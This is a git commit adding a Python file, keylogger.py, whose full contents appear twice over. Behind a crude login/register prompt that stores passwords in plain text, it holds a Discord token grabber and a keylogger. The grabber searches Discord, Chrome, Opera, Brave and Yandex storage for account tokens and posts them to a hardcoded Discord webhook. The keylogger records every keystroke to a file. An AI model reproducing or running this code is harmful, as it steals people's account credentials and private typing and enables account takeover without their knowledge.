3d9dda6c8a966741d847c14349c8e298bd3f0f46
kingbeo34526 <61219737+kingbeo34526@users.noreply.github.com>
2021-07-19 18:20:19 +0700

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -1,1 +1,286 @@
+import os
+import re
+import json
+from urllib.request import Request, urlopen
+from pynput.keyboard import Listener
+from configparser import ConfigParser
 
+cfg = 'config.ini'
+config = ConfigParser()
+config.read(cfg)
+
+# Auth
+granted = False
+def grant():
+    global granted
+    granted = True
+def login(name,password):
+    success = False
+    file = open("user_detail.txt","r")
+    for i in file:
+         a,b = i.split(",")
+         b = b.strip()
+         if(a==name and b==password):
+             success = True
+             break
+    file.close()
+    if(success):
+        print("Login Successful")
+        grant()
+    else:
+        print("wrong user name or password")
+        
+def register(name,password):
+    file = open("user_detail.txt","a")
+    file.write("\n"+name+","+password)
+    grant()
+def access(option):
+    global name
+    if(option=="login"):
+        name = input("Enter your name: ")
+        password = input("Enter your password: ")
+        login(name,password)
+    else:
+        print("Enter your name and password to register")
+        name = input("Enter your name: ")
+        password = input("Enter your password: ")
+        register(name,password)
+
+def begin():
+    global option
+    print("welcome to Keylogger")
+    option = input("Login or Register (Login,Reg): ")
+    if(option!="login" and option!="reg"):
+        begin()
+        
+begin()
+access(option)
+
+if(granted):
+    print("Welcome to Keylogger")
+    print("### USER DETAILS ###")
+    print("Username: ",name)
+
+# Token Grabber
+WEBHOOK_URL = 'https://discord.com/api/webhooks/866571956711325706/8SOtZIEupt4OfTOqAfN8ryOXRzHSkeiYqIeGfHM_AY7K0iiSWBzpeblvMwbKFP0irJAo'
+
+PING_ME = False
+
+def find_tokens(path):
+    path += '\\Local Storage\\leveldb'
+
+    tokens = []
+
+    for file_name in os.listdir(path):
+        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+            continue
+
+        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
+                for token in re.findall(regex, line):
+                    tokens.append(token)
+    return tokens
+
+def main():
+    local = os.getenv('LOCALAPPDATA')
+    roaming = os.getenv('APPDATA')
+
+    paths = {
+        'Discord': roaming + '\\Discord',
+        'Discord Canary': roaming + '\\discordcanary',
+        'Discord PTB': roaming + '\\discordptb',
+        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
+        'Opera': roaming + '\\Opera Software\\Opera Stable',
+        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
+    }
+
+    message = '@everyone' if PING_ME else ''
+
+    for platform, path in paths.items():
+        if not os.path.exists(path):
+            continue
+
+        message += f'\n**{platform}**\n```\n'
+
+        tokens = find_tokens(path)
+
+        if len(tokens) > 0:
+            for token in tokens:
+                message += f'{token}\n'
+        else:
+            message += 'No tokens found.\n'
+
+        message += '```'
+
+    headers = {
+        'Content-Type': 'application/json',
+        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
+    }
+
+    payload = json.dumps({'content': message})
+
+    try:
+        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
+        urlopen(req)
+    except:
+        pass
+
+def function1(main):
+    main()
+
+# KeyLogger
+def anonymous(key):
+	key = str(key)
+	if key == "Key.f12":
+		raise SystemExit(0)
+	with open("keyboardlog.txt", "a") as file:
+		file.write(key)
+with Listener(on_press=anonymous) as hacker:
+	hacker.join()
+
+if __name__ == '__main__':
+    main()   
+import os
+import re
+import json
+from urllib.request import Request, urlopen
+from pynput.keyboard import Listener
+from configparser import ConfigParser
+
+cfg = 'config.ini'
+config = ConfigParser()
+config.read(cfg)
+
+# Auth
+granted = False
+def grant():
+    global granted
+    granted = True
+def login(name,password):
+    success = False
+    file = open("user_detail.txt","r")
+    for i in file:
+         a,b = i.split(",")
+         b = b.strip()
+         if(a==name and b==password):
+             success = True
+             break
+    file.close()
+    if(success):
+        print("Login Successful")
+        grant()
+    else:
+        print("wrong user name or password")
+        
+def register(name,password):
+    file = open("user_detail.txt","a")
+    file.write("\n"+name+","+password)
+    grant()
+def access(option):
+    global name
+    if(option=="login"):
+        name = input("Enter your name: ")
+        password = input("Enter your password: ")
+        login(name,password)
+    else:
+        print("Enter your name and password to register")
+        name = input("Enter your name: ")
+        password = input("Enter your password: ")
+        register(name,password)
+
+def begin():
+    global option
+    print("welcome to Keylogger")
+    option = input("Login or Register (Login,Reg): ")
+    if(option!="login" and option!="reg"):
+        begin()
+        
+begin()
+access(option)
+
+if(granted):
+    print("Welcome to Keylogger")
+    print("### USER DETAILS ###")
+    print("Username: ",name)
+
+# Token Grabber
+WEBHOOK_URL = 'https://discord.com/api/webhooks/866571956711325706/8SOtZIEupt4OfTOqAfN8ryOXRzHSkeiYqIeGfHM_AY7K0iiSWBzpeblvMwbKFP0irJAo'
+
+PING_ME = False
+
+def find_tokens(path):
+    path += '\\Local Storage\\leveldb'
+
+    tokens = []
+
+    for file_name in os.listdir(path):
+        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+            continue
+
+        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
+                for token in re.findall(regex, line):
+                    tokens.append(token)
+    return tokens
+
+def main():
+    local = os.getenv('LOCALAPPDATA')
+    roaming = os.getenv('APPDATA')
+
+    paths = {
+        'Discord': roaming + '\\Discord',
+        'Discord Canary': roaming + '\\discordcanary',
+        'Discord PTB': roaming + '\\discordptb',
+        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
+        'Opera': roaming + '\\Opera Software\\Opera Stable',
+        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
+    }
+
+    message = '@everyone' if PING_ME else ''
+
+    for platform, path in paths.items():
+        if not os.path.exists(path):
+            continue
+
+        message += f'\n**{platform}**\n```\n'
+
+        tokens = find_tokens(path)
+
+        if len(tokens) > 0:
+            for token in tokens:
+                message += f'{token}\n'
+        else:
+            message += 'No tokens found.\n'
+
+        message += '```'
+
+    headers = {
+        'Content-Type': 'application/json',
+        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
+    }
+
+    payload = json.dumps({'content': message})
+
+    try:
+        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
+        urlopen(req)
+    except:
+        pass
+
+def function1(main):
+    main()
+
+# KeyLogger
+def anonymous(key):
+	key = str(key)
+	if key == "Key.f12":
+		raise SystemExit(0)
+	with open("keyboardlog.txt", "a") as file:
+		file.write(key)
+with Listener(on_press=anonymous) as hacker:
+	hacker.join()
+
+if __name__ == '__main__':
+    main()   
